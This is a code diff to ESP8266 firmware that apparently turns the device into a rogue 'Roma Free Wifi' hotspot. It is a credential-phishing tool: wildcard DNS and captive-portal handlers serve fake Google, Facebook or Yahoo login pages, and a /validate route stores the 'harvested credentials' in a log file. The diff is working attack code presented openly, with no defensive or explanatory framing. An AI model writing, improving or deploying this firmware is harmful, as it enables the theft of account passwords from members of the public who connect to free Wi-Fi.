@@ -13,21 +13,34 @@
 #include <DNSServer.h>
 #include <ESP8266mDNS.h>
 #include <FS.h>
-#include "config.h"
-#include "site1.h"
-#include "site2.h"
-#include "site3.h"
-#include "sitecaptiveportal.h"
-#include "portal_login.h"
+#include "google.h"
+#include "facebook.h"
+#include "yahoo.h"
 
 #define LOGFILE "/log.txt"
 
+/*
+ *************************
+ * ACCESS POINT SSID
+ * ***********************
+ */
+const char *ssid="Roma Free Wifi";
+
+/*
+ *************************
+ * LOGIN CAPTURE PAGE
+ * ***********************
+ */
+ // Can be Google, Facebook or Yahoo
+#define captivePortalPage GOOGLE_HTML
+ // GOOGLE_HTML, FACEBOOK_HTML, YAHOO_HTML
+
 // Basic configuration using common network setups (usual DNS port, IP and web server port)
 const byte DNS_PORT = 53;
-IPAddress apIP(192, 168, 1, 1);
+IPAddress apIP(192, 168, 4, 1);
+IPAddress netMsk(255, 255, 255, 0);
 DNSServer dnsServer;
 ESP8266WebServer webServer(80);
-ESP8266WebServer httpServer(1337);
 
 // Buffer strings
 String webString="";
@@ -79,47 +92,26 @@ void setup() {
 
   // Create Access Point
   Serial.print("Creating Access Point...");
+  WiFi.setOutputPower(20.5); // max output power
   WiFi.mode(WIFI_AP);
-  WiFi.softAPConfig(apIP, apIP, IPAddress(255, 255, 255, 0));
-  WiFi.softAP(setSSID);
+  WiFi.softAPConfig(apIP, apIP, netMsk);
+  WiFi.softAP(ssid);
+  delay(500);
   Serial.println(" Success!");
 
   // Start DNS Server
   Serial.print("Starting DNS Server...");
+  dnsServer.setErrorReplyCode(DNSReplyCode::NoError);
   dnsServer.start(DNS_PORT, "*", apIP);
   Serial.println(" Success!");
 
   // Check domain name and refresh page
-  webServer.onNotFound([]() {
-    webServer.send(200, "text/html", responseHTML);
-  });
+  webServer.on("/", handleRoot);
+  webServer.on("/generate_204", handleRoot);  //Android captive portal. Maybe not needed. Might be handled by notFound handler.
+  webServer.on("/fwlink", handleRoot);  //Microsoft captive portal. Maybe not needed. Might be handled by notFound handler.
+  webServer.onNotFound(handleRoot);
 
-  // Generic catch all login page for domains not listed in configuration
-  webServer.on(SITEOTHER_redirect,[]() {
-    webServer.send_P(200, "text/html", GOOGLE_HTML);
-  });
-
-  // SITE1 login page
-  webServer.on(SITE1_redirect,[]() {
-    webServer.send_P(200, "text/html", GOOGLE_HTML);
-  });
-
-  // SITE2 login page
-  webServer.on(SITE2_redirect,[]() {
-    webServer.send_P(200, "text/html", FACEBOOK_HTML);
-  });
-
-  // SITE3 login page
-  webServer.on(SITE3_redirect,[]() {
-    webServer.send_P(200, "text/html", YAHOO_HTML);
-  });
-
-  // Captive portal login page
-  webServer.on(PORTALLOGIN_redirect,[]() {
-    webServer.send(200, "text/html", PORTAL_LOGIN_HTML);
-  });
-
-  // Validate-Save USER/PASS combinations
+  // Validate and save USER/PASS combinations
   webServer.on("/validate", []() {
     // store harvested credentials
     String url = webServer.arg("url");
@@ -179,17 +171,22 @@ void setup() {
   // Start Webserver
   Serial.print("Starting Web Server...");
   webServer.begin();
-  httpServer.begin();
-
-  MDNS.addService("http", "tcp", 1337);
   Serial.println(" Success!");
+  
   blink(10);
+  
   Serial.println("Device Ready!");
 }
 
 void loop() {
-  // Check for DNS Request/Dish out Web Pages
   dnsServer.processNextRequest();
   webServer.handleClient();
-  httpServer.handleClient();
+}
+
+void handleRoot() {
+  webServer.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
+  webServer.sendHeader("Pragma", "no-cache");
+  webServer.sendHeader("Expires", "-1");
+
+  webServer.send(200, "text/html", captivePortalPage);
 }
